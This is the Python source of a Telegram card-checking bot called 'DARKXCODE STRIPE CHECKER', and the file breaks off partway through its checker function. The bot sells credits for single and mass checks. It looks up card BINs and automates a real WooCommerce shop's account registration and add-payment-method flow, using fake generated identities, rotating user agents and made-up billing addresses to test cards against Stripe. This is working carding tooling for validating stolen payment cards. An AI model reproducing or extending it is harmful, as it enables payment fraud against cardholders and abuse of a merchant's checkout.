import asyncio
import json
import random
import datetime
import time
import os
from dotenv import load_dotenv
import re
import sys
import aiohttp
import string
import uuid
from bs4 import BeautifulSoup
from mimesis import Generic as Gen
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram.error import NetworkError, BadRequest, TimedOut
import logging
from telegram.helpers import escape_markdown
import asyncpg
import firebase_admin
from firebase_admin import credentials, firestore
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import requests
import shutil
from pathlib import Path

load_dotenv()


def init_firebase():
    """Initialize Firebase and return connection status"""
    try:
        # Load Firebase credentials from environment variables
        firebase_config = {
            "type":
            os.getenv("FIREBASE_TYPE", "service_account"),
            "project_id":
            os.getenv("FIREBASE_PROJECT_ID", ""),
            "private_key_id":
            os.getenv("FIREBASE_PRIVATE_KEY_ID", ""),
            "private_key":
            os.getenv("FIREBASE_PRIVATE_KEY", "").replace('\\n', '\n')
            if os.getenv("FIREBASE_PRIVATE_KEY") else "",
            "client_email":
            os.getenv("FIREBASE_CLIENT_EMAIL", ""),
            "client_id":
            os.getenv("FIREBASE_CLIENT_ID", ""),
            "auth_uri":
            os.getenv("FIREBASE_AUTH_URI",
                      "https://accounts.google.com/o/oauth2/auth"),
            "token_uri":
            os.getenv("FIREBASE_TOKEN_URI",
                      "https://oauth2.googleapis.com/token"),
            "auth_provider_x509_cert_url":
            os.getenv("FIREBASE_AUTH_PROVIDER_CERT_URL",
                      "https://www.googleapis.com/oauth2/v1/certs"),
            "client_x509_cert_url":
            os.getenv("FIREBASE_CLIENT_CERT_URL", "")
        }

        # Check if any Firebase credentials are provided
        has_firebase_creds = any([
            firebase_config.get("project_id"),
            firebase_config.get("private_key"),
            firebase_config.get("client_email")
        ])

        if not has_firebase_creds:
            print(
                "ℹ️  No Firebase credentials found. Using in-memory storage.")
            return None, False

        # Validate required fields
        required_fields = ["project_id", "private_key", "client_email"]
        missing_fields = []

        for field in required_fields:
            if not firebase_config.get(field):
                missing_fields.append(field)

        if missing_fields:
            print(
                f"⚠️  Missing Firebase config fields: {', '.join(missing_fields)}"
            )
            print("⚠️  Using in-memory storage (data will be lost on restart)")
            return None, False

        # Initialize Firebase
        cred = credentials.Certificate(firebase_config)
        firebase_admin.initialize_app(cred)
        db = firestore.client()
        print("✅ Firebase connected successfully")

        # Test connection - FIXED
        test_ref = db.collection('test').document('connection_test')
        test_ref.set({
            'test': True,
            'timestamp': firestore.SERVER_TIMESTAMP  # Use Firebase timestamp
        })
        print("✅ Firebase write test successful")
        return db, True
    except Exception as e:
        print(f"⚠️  Firebase connection failed: {e}")
        print("⚠️  Using in-memory storage (data will be lost on restart)")
        return None, False


# Initialize Firebase
db, firebase_connected = init_firebase()


def get_db():
    """Get Firebase database instance"""
    return db


# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO)
logger = logging.getLogger(__name__)

RECEIVED_FOLDER = "received"
PUBLIC_HITS_FOLDER = "hits/public"
PRIVATE_HITS_FOLDER = "hits/private"
USER_LOGS_FOLDER = "user_logs"
APPROVED_LOG_CHANNEL = -5194693157
LIVE_LOG_CHANNEL = -5194693157
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",")]
CHANNEL_LINK = os.getenv("CHANNEL_LINK", "")
DOMAIN = "jogoka.com"
PK = os.getenv(
    "STRIPE_PK",
    ""
)

Path(RECEIVED_FOLDER).mkdir(exist_ok=True)
Path(PUBLIC_HITS_FOLDER).mkdir(exist_ok=True)
Path(PRIVATE_HITS_FOLDER).mkdir(exist_ok=True)
Path(USER_LOGS_FOLDER).mkdir(exist_ok=True)

STATUS_MAPPING = {
    "approved": "Auth Success",
    "live": "Insufficient Funds",
    "dead": "Card Declined",
    "ccn": "CCN",
    "cvv": "CVV Wrong"
}

# Bot info
BOT_INFO = {
    "name":
    "⚡ DARKXCODE STRIPE CHECKER ⚡",
    "version":
    "2.0",  # Updated version
    "creator":
    "@ISHANT_OFFICIAL",
    "gates":
    "Stripe 1$ Charge",  # Updated gateway name
    "features":
    "• Fast Single Check\n• Mass Checks\n• Real-time Statistics\n• Invite & Earn System\n• NEW: jogoka.com Gateway"
}

# In-memory storage as fallback
in_memory_users = {}
in_memory_gift_codes = {}
in_memory_claimed_codes = {}
in_memory_bot_stats = {
    "total_checks": 0,
    "total_approved": 0,
    "total_declined": 0,
    "total_credits_used": 0,
    "total_users": 0,
    "start_time": datetime.datetime.now().isoformat()  # FIXED
}

# User-Agent rotation list
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
]

# Billing addresses for different card locations (simplified)
BILLING_ADDRESSES = {
    "US": [
        {
            "name": "Waiyan",
            "postal_code": "10080",
            "city": "Bellevue",
            "state": "NY",
            "country": "US",
            "address_line_1": "7246 Royal Ln"
        },
        {
            "name": "John Smith",
            "postal_code": "10001",
            "city": "New York",
            "state": "NY",
            "country": "US",
            "address_line_1": "123 Main St"
        },
        {
            "name": "Michael Johnson",
            "postal_code": "90210",
            "city": "Beverly Hills",
            "state": "CA",
            "country": "US",
            "address_line_1": "456 Sunset Blvd"
        },
    ],
    "UK": [
        {
            "name": "James Wilson",
            "postal_code": "SW1A 1AA",
            "city": "London",
            "state": "England",
            "country": "GB",
            "address_line_1": "10 Downing Street"
        },
        {
            "name": "Thomas Brown",
            "postal_code": "M1 1AA",
            "city": "Manchester",
            "state": "England",
            "country": "GB",
            "address_line_1": "25 Oxford Rd"
        },
    ]
}

# Database connection pool
db_pool = None


def parseX(data, start, end):
    try:
        if not data or not start or not end:
            return None
        if start not in data:
            return None
        star = data.index(start) + len(start)
        if end not in data[star:]:
            return None
        last = data.index(end, star)
        return data[star:last]
    except (ValueError, TypeError, AttributeError):
        return None

def escape_html(text):
    """Escape HTML special characters"""
    if text is None:
        return ""
    text = str(text)
    escape_chars = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
    }
    for char, replacement in escape_chars.items():
        text = text.replace(char, replacement)
    return text


def escape_markdown_v2(text):
    """Escape markdown v2 special characters for Telegram"""
    if not text:
        return text
    # Escape all markdown special characters
    escape_chars = '_*[]()~`>#+-=|{}.!'
    for char in escape_chars:
        text = text.replace(char, f'\\{char}')
    return text


def safe_card_format(card_data):
    """Safely format card data for Telegram messages"""
    try:
        if "|" in card_data:
            parts = card_data.split("|")
            if len(parts) >= 4:
                # Return as HTML code block
                return f"<code>{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}</code>"
        return f"<code>{card_data}</code>"
    except:
        return "<code>Invalid card format</code>"

def magneto_check(number: str) -> bool:
    """Validate card number using Luhn algorithm"""
    digits = ''.join(ch for ch in number if ch.isdigit())
    if not digits:
        return False
    total = 0
    reverse = digits[::-1]
    for i, ch in enumerate(reverse):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def generate_gift_code(length=16):
    """Generate a random gift code"""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def get_billing_address(card_bin=""):
    """Get random billing address based on card BIN or random country"""
    # Default to US if no BIN or unknown BIN
    if not card_bin or len(card_bin) < 6:
        country = random.choice(list(BILLING_ADDRESSES.keys()))
    else:
        # Simple BIN to country mapping
        bin_prefix = card_bin[:2]
        if bin_prefix in [
                "40", "41", "42", "43", "44", "45", "46", "47", "48", "49"
        ]:
            country = "US"  # Visa
        elif bin_prefix in ["51", "52", "53", "54", "55"]:
            country = "US"  # Mastercard
        elif bin_prefix in ["34", "37"]:
            country = "US"  # Amex
        elif bin_prefix in ["60", "65"]:
            country = "US"  # Discover/RuPay
        else:
            country = "US"  # Default to US

    # Make sure the country exists in our addresses
    if country not in BILLING_ADDRESSES:
        country = "US"

    return random.choice(BILLING_ADDRESSES[country])


def format_universal_result(card_data,
                            status,
                            message=None,
                            gateway="Stripe Gateway",
                            username=None,
                            time_taken=None):
    """New exact format as requested - FIXED for HTML"""
    try:
        # Parse card data
        if isinstance(card_data, str):
            if "|" in card_data:
                cc, mon, year, cvv = card_data.split("|")
            else:
                cc = card_data
                mon = "01"
                year = "25"
                cvv = "123"
        elif isinstance(card_data, (tuple, list)):
            if len(card_data) >= 4:
                cc, mon, year, cvv = card_data[:4]
            else:
                cc = card_data[0] if card_data else "0000000000000000"
                mon = "01"
                year = "25"
                cvv = "123"
        else:
            cc = "0000000000000000"
            mon = "01"
            year = "25"
            cvv = "123"

        cc_clean = cc.replace(" ", "")
        
        # Get BIN info
        bin_info = get_bin_info(cc_clean[:6])
        
        # Determine status and response
        status_display = status.capitalize()
        response_msg = STATUS_MAPPING.get(status.lower(), str(message)[:50] if message else status.capitalize())
        
        # Format time
        if time_taken is None:
            time_taken = random.uniform(1.0, 2.5)
        
        # Build the exact format with HTML
        result = f"""
[↯] Card: <code>{cc}|{mon}|{year}|{cvv}</code>
[↯] Status: {status_display}
[↯] Response: {escape_html(response_msg)}
[↯] Gateway: {escape_html(gateway)}
- - - - - - - - - - - - - - - - - - - - - -
[↯] Bin Info:-
[↯] Bank: {escape_html(bin_info['bank'])}
[↯] Country: {bin_info['country']} {bin_info['country_flag']}
- - - - - - - - - - - - - - - - - - - - - -
[↯] 𝐓𝐢𝐦𝐞: {time_taken:.2f}s
- - - - - - - - - - - - - - - - - - - - - -
[↯] User : @{escape_html(username or 'N/A')}
[↯] Made By: @ISHANT_OFFICIAL
[↯] Bot: @DARKXCODE_STRIPE_BOT
"""
        
        return result

    except Exception as e:
        logger.error(f"Error in format_universal_result: {e}")
        return f"[↯] Error: {escape_html(str(e)[:50])}"


def random_email():
    """Generate random email"""
    names = ["Kmo", "Waiyan", "John", "Mike", "David", "Sarah"]
    random_name = random.choice(names)
    random_numbers = "".join(str(random.randint(0, 9)) for _ in range(4))
    return f"{random_name}{random_numbers}@gmail.com"


def get_bin_info(bin_number):
    """Get BIN information from antipublic.cc"""
    try:
        if not bin_number or len(bin_number) < 6:
            return {
                "bank": "Unknown",
                "country": "Unknown",
                "country_flag": "🏳️"
            }

        response = requests.get(
            f"https://bins.antipublic.cc/bins/{bin_number[:6]}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get("bank", "Unknown"),
                "country": data.get("country", "Unknown"),
                "country_flag": data.get("country_flag", "🏳️")
            }
    except Exception as e:
        logger.error(f"BIN API error: {e}")

    return {"bank": "Unknown", "country": "Unknown", "country_flag": "🏳️"}


# In-memory storage as fallback
in_memory_users = {}
in_memory_gift_codes = {}
in_memory_claimed_codes = {}
in_memory_bot_stats = {
    "total_checks": 0,
    "total_approved": 0,
    "total_declined": 0,
    "total_credits_used": 0,
    "total_users": 0,
    "start_time": datetime.datetime.now().isoformat()
}


# Firebase functions to replace PostgreSQL functions
async def get_user(user_id):
    """Get user from Firebase or memory"""
    db = get_db()

    if db:
        try:
            user_ref = db.collection('users').document(str(user_id))
            user_doc = user_ref.get()

            if user_doc.exists:
                return user_doc.to_dict()
            else:
                # Create new user
                new_user = {
                    "user_id": user_id,
                    "username": "",
                    "first_name": "",
                    "joined_date": firestore.SERVER_TIMESTAMP,
                    "last_active": firestore.SERVER_TIMESTAMP,
                    "credits": 0,
                    "credits_spent": 0,
                    "total_checks": 0,
                    "approved_cards": 0,
                    "declined_cards": 0,
                    "checks_today": 0,
                    "last_check_date": None,
                    "joined_channel": False,
                    "referrer_id": None,
                    "referrals_count": 0,
                    "earned_from_referrals": 0
                }
                user_ref.set(new_user)

                # Update bot statistics
                stats_ref = db.collection('bot_statistics').document('stats')
                stats_doc = stats_ref.get()
                if stats_doc.exists:
                    stats_ref.update({"total_users": firestore.Increment(1)})
                else:
                    stats_ref.set({
                        "total_checks": 0,
                        "total_approved": 0,
                        "total_declined": 0,
                        "total_credits_used": 0,
                        "total_users": 1,
                        "start_time": firestore.SERVER_TIMESTAMP
                    })

                return new_user

        except Exception as e:
            logger.error(f"Firebase error in get_user: {e}")

    # Fallback to in-memory storage
    if user_id not in in_memory_users:
        in_memory_users[user_id] = {
            "user_id": user_id,
            "username": "",
            "first_name": "",
            "joined_date": datetime.datetime.now().isoformat(),
            "last_active": datetime.datetime.now().isoformat(),
            "credits": 0,
            "credits_spent": 0,
            "total_checks": 0,
            "approved_cards": 0,
            "declined_cards": 0,
            "checks_today": 0,
            "last_check_date": None,
            "joined_channel": False,
            "referrer_id": None,
            "referrals_count": 0,
            "earned_from_referrals": 0
        }
        in_memory_bot_stats["total_users"] += 1

    return in_memory_users[user_id]


async def update_user(user_id, updates):
    """Update user data in Firebase or memory"""
    db = get_db()

    # Convert datetime.date to string for Firebase
    processed_updates = updates.copy()
    for key, value in updates.items():
        if isinstance(value, datetime.date):
            processed_updates[key] = value.isoformat()
        elif isinstance(value, datetime.datetime):
            processed_updates[key] = value.isoformat()

    if db:
        try:
            user_ref = db.collection('users').document(str(user_id))

            # Remove last_active from processed_updates if it exists
            if 'last_active' in processed_updates:
                processed_updates['last_active'] = firestore.SERVER_TIMESTAMP
            else:
                processed_updates['last_active'] = firestore.SERVER_TIMESTAMP

            user_ref.update(processed_updates)
            return
        except Exception as e:
            logger.error(f"Firebase error in update_user: {e}")
            # Try without SERVER_TIMESTAMP as fallback
            try:
                user_ref = db.collection('users').document(str(user_id))
                if 'last_active' in processed_updates:
                    processed_updates['last_active'] = datetime.datetime.now(
                    ).isoformat()
                user_ref.update(processed_updates)
                return
            except Exception as e2:
                logger.error(f"Firebase fallback error in update_user: {e2}")

    # Fallback to in-memory storage
    if user_id in in_memory_users:
        in_memory_users[user_id].update(processed_updates)
        in_memory_users[user_id]["last_active"] = datetime.datetime.now(
        ).isoformat()


async def get_bot_stats():
    """Get bot statistics from Firebase with better error handling"""
    try:
        db = get_db()
        
        if db:
            try:
                stats_ref = db.collection('bot_statistics').document('stats')
                stats_doc = stats_ref.get()
                if stats_doc.exists:
                    stats_data = stats_doc.to_dict()
                    
                    # Ensure all required fields exist
                    default_stats = {
                        "total_checks": 0,
                        "total_approved": 0,
                        "total_declined": 0,
                        "total_credits_used": 0,
                        "total_users": 0,
                        "start_time": datetime.datetime.now().isoformat()
                    }
                    
                    # Merge with defaults to ensure all keys exist
                    for key, value in default_stats.items():
                        if key not in stats_data:
                            stats_data[key] = value
                    
                    return stats_data
            except Exception as e:
                logger.error(f"Firebase error in get_bot_stats: {e}")
                # Fall through to in-memory
    except Exception as e:
        logger.error(f"Error getting database in get_bot_stats: {e}")
    
    # Fallback to in-memory with safe defaults
    safe_stats = in_memory_bot_stats.copy()
    
    # Ensure all required fields exist
    required_fields = ["total_checks", "total_approved", "total_declined", 
                       "total_credits_used", "total_users", "start_time"]
    for field in required_fields:
        if field not in safe_stats:
            if field == "start_time":
                safe_stats[field] = datetime.datetime.now().isoformat()
            else:
                safe_stats[field] = 0
    
    return safe_stats


async def update_bot_stats(updates):
    """Update bot statistics in Firebase with better error handling"""
    try:
        db = get_db()
        
        if db:
            try:
                stats_ref = db.collection('bot_statistics').document('stats')
                
                # First, check if document exists
                stats_doc = stats_ref.get()
                
                if not stats_doc.exists:
                    # Create document with initial values
                    initial_stats = {
                        "total_checks": 0,
                        "total_approved": 0,
                        "total_declined": 0,
                        "total_credits_used": 0,
                        "total_users": 0,
                        "start_time": firestore.SERVER_TIMESTAMP
                    }
                    stats_ref.set(initial_stats)
                
                # Prepare update dictionary with Increment operations
                firestore_updates = {}
                for key, value in updates.items():
                    firestore_updates[key] = firestore.Increment(value)
                
                # Update the document
                stats_ref.update(firestore_updates)
                return
            except Exception as e:
                logger.error(f"Firebase error in update_bot_stats: {e}")
                # Fall through to in-memory update
    except Exception as e:
        logger.error(f"Error getting database in update_bot_stats: {e}")
    
    # Fallback to in-memory storage
    for key, value in updates.items():
        if key in in_memory_bot_stats:
            in_memory_bot_stats[key] += value
        else:
            in_memory_bot_stats[key] = value


async def botinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /botinfo command - Shows bot statistics (admin only)"""
    try:
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            if update.message:
                await update.message.reply_text(
                    "❌ This command is for administrators only.",
                    parse_mode=ParseMode.HTML)
            return
        
        # Get stats with error handling
        try:
            stats = await get_bot_stats()
        except Exception as e:
            logger.error(f"Error getting bot stats: {e}")
            await update.message.reply_text(
                "<b>❌ ERROR LOADING STATISTICS</b>\n"
                "Unable to fetch bot statistics. Please try again later.",
                parse_mode=ParseMode.HTML)
            return
        
        # Safely parse start_time
        start_time = stats.get("start_time", datetime.datetime.now())
        
        try:
            if isinstance(start_time, str):
                if 'Z' in start_time:
                    start_time = datetime.datetime.fromisoformat(
                        start_time.replace('Z', '+00:00'))
                else:
                    start_time = datetime.datetime.fromisoformat(start_time)
            elif isinstance(start_time, datetime.datetime):
                pass  # Already a datetime object
            elif isinstance(start_time, datetime.date):
                start_time = datetime.datetime.combine(start_time, datetime.datetime.min.time())
            else:
                start_time = datetime.datetime.now()
        except Exception as e:
            logger.error(f"Error parsing start_time: {e}")
            start_time = datetime.datetime.now()
        
        # Calculate bot uptime
        now = datetime.datetime.now()
        
        # Handle timezone differences
        if start_time.tzinfo is not None and now.tzinfo is None:
            now = now.replace(tzinfo=datetime.timezone.utc)
        elif start_time.tzinfo is None and now.tzinfo is not None:
            start_time = start_time.replace(tzinfo=datetime.timezone.utc)
        
        uptime = now - start_time
        days = uptime.days
        hours = uptime.seconds // 3600
        minutes = (uptime.seconds % 3600) // 60
        
        # Calculate success rate safely
        total_checks = stats.get("total_checks", 0)
        total_approved = stats.get("total_approved", 0)
        
        if total_checks > 0:
            success_rate = (total_approved / total_checks) * 100
        else:
            success_rate = 0
        
        # Calculate average credits per user safely
        total_users = max(stats.get("total_users", 1), 1)  # Ensure at least 1 to avoid division by zero
        total_credits_used = stats.get("total_credits_used", 0)
        avg_credits = total_credits_used / total_users
        
        # Get gift codes count from Firebase or memory
        total_gift_codes = 0
        try:
            db = get_db()
            if db:
                codes_ref = db.collection('gift_codes')
                codes_docs = codes_ref.get()
                total_gift_codes = len(codes_docs)
            else:
                total_gift_codes = len(in_memory_gift_codes)
        except Exception as e:
            logger.error(f"Error counting gift codes: {e}")
            total_gift_codes = len(in_memory_gift_codes)
        
        # Format start time for display
        if isinstance(start_time, datetime.datetime):
            start_time_str = start_time.strftime('%Y-%m-%d %H:%M:%S')
        else:
            start_time_str = str(start_time)
        
        # Format large numbers with commas
        def format_number(num):
            return f"{num:,}"
        
        # Build response message using HTML (safer than markdown)
        response_message = f"""<b>📊 BOT STATISTICS (ADMIN)</b>
══════════════════════
<b>Uptime:</b> {days}d {hours}h {minutes}m
<b>Started:</b> {start_time_str}

<b>User Statistics:</b>
• Total Users: {format_number(stats.get('total_users', 0))}
• Active Checks: {format_number(len(checking_tasks))}

<b>Card Checking Stats:</b>
• Total Checks: {format_number(total_checks)}
• 🔥 Charge: {format_number(total_approved)}
• ❌ Declined: {format_number(stats.get('total_declined', 0))}
• Success Rate: {success_rate:.1f}%

<b>Credit Statistics:</b>
• Total Credits Used: {format_number(total_credits_used)}
• Avg Credits/User: {avg_credits:.1f}
• Active Gift Codes: {format_number(total_gift_codes)}

<b>System Status:</b>
• Storage: {'✅ Firebase' if firebase_connected else '⚠️ In-memory'}
• Active Users: {format_number(len(in_memory_users))}
• Files in Queue: {format_number(len(files_storage))}

<b>Bot Info:</b>
• Name: {escape_markdown_v2(BOT_INFO['name'])}
• Version: {BOT_INFO['version']}
• Creator: {escape_markdown_v2(BOT_INFO['creator'])}
══════════════════════
"""
        
        # Add a back button
        keyboard = [[
            InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_panel")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send the message using HTML parse mode (safer)
        if update.message:
            await update.message.reply_text(
                response_message,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup)
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                response_message,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup)
            
    except Exception as e:
        logger.error(f"Error in botinfo_command: {e}")
        error_message = f"""<b>⚠️ SYSTEM ERROR</b>
══════════════════════
An error occurred while processing botinfo.

<b>Error details:</b>
<code>{escape_html(str(e)[:100])}</code>

Please try again or contact the developer.
══════════════════════
"""
        if update.message:
            await update.message.reply_text(
                error_message,
                parse_mode=ParseMode.HTML)
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                error_message,
                parse_mode=ParseMode.HTML)


def escape_html(text):
    """Escape HTML special characters"""
    if text is None:
        return ""
    text = str(text)
    escape_chars = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
    }
    for char, replacement in escape_chars.items():
        text = text.replace(char, replacement)
    return text


def escape_markdown_v2(text):
    """Escape markdown v2 special characters"""
    if not text:
        return text
    # Escape all markdown special characters
    escape_chars = '_*[]()~`>#+-=|{}.!'
    for char in escape_chars:
        text = text.replace(char, f'\\{char}')
    return text


async def get_all_gift_codes():
    """Get all gift codes from Firebase"""
    db = get_db()

    if db:
        try:
            codes_ref = db.collection('gift_codes')
            codes_docs = codes_ref.stream()

            gift_codes = []
            for doc in codes_docs:
                gift_codes.append(doc.to_dict())

            return gift_codes
        except Exception as e:
            logger.error(f"Firebase error in get_all_gift_codes: {e}")

    # Fallback to in-memory
    return list(in_memory_gift_codes.values())


async def create_gift_code(code, credits, max_uses, created_by):
    """Create a gift code in Firebase"""
    db = get_db()

    if db:
        try:
            gift_ref = db.collection('gift_codes').document(code)
            gift_ref.set({
                "code": code,
                "credits": credits,
                "max_uses": max_uses,
                "uses": 0,
                "created_at": firestore.SERVER_TIMESTAMP,
                "created_by": created_by,
                "claimed_by": []
            })
            return True
        except Exception as e:
            logger.error(f"Firebase error in create_gift_code: {e}")

    # Fallback to in-memory
    in_memory_gift_codes[code] = {
        "code": code,
        "credits": credits,
        "max_uses": max_uses,
        "uses": 0,
        "created_at": datetime.datetime.now().isoformat(),
        "created_by": created_by,
        "claimed_by": []
    }
    return True


async def get_gift_code(code):
    """Get gift code from Firebase"""
    db = get_db()

    if db:
        try:
            gift_ref = db.collection('gift_codes').document(code)
            gift_doc = gift_ref.get()
            if gift_doc.exists:
                return gift_doc.to_dict()
        except Exception as e:
            logger.error(f"Firebase error in get_gift_code: {e}")

    # Fallback to in-memory
    return in_memory_gift_codes.get(code)


async def update_gift_code_usage(code, user_id):
    """Update gift code usage in Firebase"""
    db = get_db()

    if db:
        try:
            gift_ref = db.collection('gift_codes').document(code)

            # Update uses and claimed_by
            gift_ref.update({
                "uses": firestore.Increment(1),
                "claimed_by": firestore.ArrayUnion([str(user_id)])
            })

            # Add to claimed codes
            claimed_ref = db.collection('user_claimed_codes').document(
                f"{user_id}_{code}")
            claimed_ref.set({
                "user_id": user_id,
                "code": code,
                "claimed_at": firestore.SERVER_TIMESTAMP
            })

            return True
        except Exception as e:
            logger.error(f"Firebase error in update_gift_code_usage: {e}")

    # Fallback to in-memory
    if code in in_memory_gift_codes:
        in_memory_gift_codes[code]["uses"] += 1
        in_memory_gift_codes[code]["claimed_by"].append(str(user_id))

        if user_id not in in_memory_claimed_codes:
            in_memory_claimed_codes[user_id] = []
        in_memory_claimed_codes[user_id].append(code)

    return True


# ==================== NEW CHECKER ENGINE ====================

async def magneto_check(number: str) -> bool:
    """Luhn validation check"""
    digits = ''.join(ch for ch in number if ch.isdigit())
    if not digits:
        return False
    total = 0
    reverse = digits[::-1]
    for i, ch in enumerate(reverse):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def generate_random_time():
    """Generate random timestamp"""
    return int(time.time()) - random.randint(100, 1000)

def uu_again_service():
    """Generate fake user information"""
    Fakeuserinformation = Gen('en')
    CheckGM = ['gmail.com', 'hotmail.com', 'yahoo.com', 'live.com', 'paypal.com', 'outlook.com']
    
    first = Fakeuserinformation.person.first_name().lower()
    num = random.randint(100, 9999)
    
    return {
        "email": f"{first}{num}@{random.choice(CheckGM)}",
        "country": Fakeuserinformation.address.country(),
        "city": Fakeuserinformation.address.city(),
        "ug": Fakeuserinformation.internet.user_agent(),
        "fullnm": Fakeuserinformation.person.full_name(),
        "lastname": Fakeuserinformation.person.last_name().lower(),
        "firstname": Fakeuserinformation.person.first_name().lower()
    }

async def new_gateway_check(cc, mm, yy, cvv):
    """Working Stripe checker with status categorization"""
    try:
        logger.info(f"Checking card: {cc}|{mm}|{yy}|{cvv}")
        
        # Clean year
        if len(yy) == 4 and yy.startswith('20'):
            yy = yy[2:]
        
        # Generate fake user
        Fakeuserinformation = Gen('en')
        CheckGM = ['gmail.com', 'hotmail.com', 'yahoo.com', 'live.com', 'paypal.com', 'outlook.com']
        first = Fakeuserinformation.person.first_name().lower()
        num = random.randint(100, 9999)
        
        user = {
            "email": f"{first}{num}@{random.choice(CheckGM)}",
            "country": Fakeuserinformation.address.country(),
            "city": Fakeuserinformation.address.city(),
            "ug": Fakeuserinformation.internet.user_agent(),
            "fullnm": Fakeuserinformation.person.full_name(),
            "lastname": Fakeuserinformation.person.last_name().lower(),
            "firstname": Fakeuserinformation.person.first_name().lower()
        }
        
        ime = int(time.time()) - random.randint(100, 1000)
        
        # Step 1: Get account page
        page_one = "https://jogoka.com/my-account/"
        h1 = {
            'User-Agent': user["ug"],
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        }
        
        async with aiohttp.ClientSession() as session:
            # Get account page
            async with session.get(page_one, headers=h1, timeout=30) as r1:
                if r1.status != 200:
                    return cc, "dead", f"Page Error {r1.status}", r1.status
                
                r1_text = await r1.text()
                soup = BeautifulSoup(r1_text, "html.parser")
                tok = soup.find("input", {"name": "woocommerce-register-nonce"})
                token = tok["value"] if tok else None
                
                if not token:
                    # Try alternative token names
                    for token_name in ["woocommerce-login-nonce", "_wpnonce", "security", "nonce"]:
                        tok = soup.find("input", {"name": token_name})
                        if tok and tok.get("value"):
                            token = tok["value"]
                            break
                
                if not token:
                    return cc, "dead", "Registration token not found", 0
            
            # Step 2: Register account
            p1 = {
                'email': user['email'],
                'wc_order_attribution_source_type': "typein",
                'wc_order_attribution_referrer': "(none)",
                'wc_order_attribution_utm_campaign': "(none)",
                'wc_order_attribution_utm_source': "(direct)",
                'wc_order_attribution_utm_medium': "(none)",
                'wc_order_attribution_utm_content': "(none)",
                'wc_order_attribution_utm_id': "(none)",
                'wc_order_attribution_utm_term': "(none)",
                'wc_order_attribution_utm_source_platform': "(none)",
                'wc_order_attribution_utm_creative_format': "(none)",
                'wc_order_attribution_utm_marketing_tactic': "(none)",
                'wc_order_attribution_session_entry': f"https://jogoka.com/my-account/",
                'wc_order_attribution_session_start_time': str(ime),
                'wc_order_attribution_session_pages': "1",
                'wc_order_attribution_session_count': "1",
                'wc_order_attribution_user_agent': user["ug"],
                'woocommerce-register-nonce': token,
                '_wp_http_referer': "/my-account/",
                'register': "Register"
            }
            
            async with session.post(page_one, data=p1, headers=h1, timeout=30) as r2:
                if r2.status not in [200, 302]:
                    return cc, "dead", f"Registration failed {r2.status}", r2.status
            
            # Get session cookies
            cookies_str = "; ".join([f"{c.key}={c.value}" for c in session.cookie_jar])
            
            # Step 3: Get payment page
            page_payment = "https://jogoka.com/my-account/add-payment-method/"
            h2 = {
                'User-Agent': user["ug"],
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                'referer': "https://jogoka.com/my-account/payment-methods/",
                'Cookie': cookies_str
            }
            
            async with session.get(page_payment, headers=h2, timeout=30) as r3:
                if r3.status != 200:
                    return cc, "dead", f"Payment page error {r3.status}", r3.status
                
                r3_text = await r3.text()
                
                # Extract Stripe keys
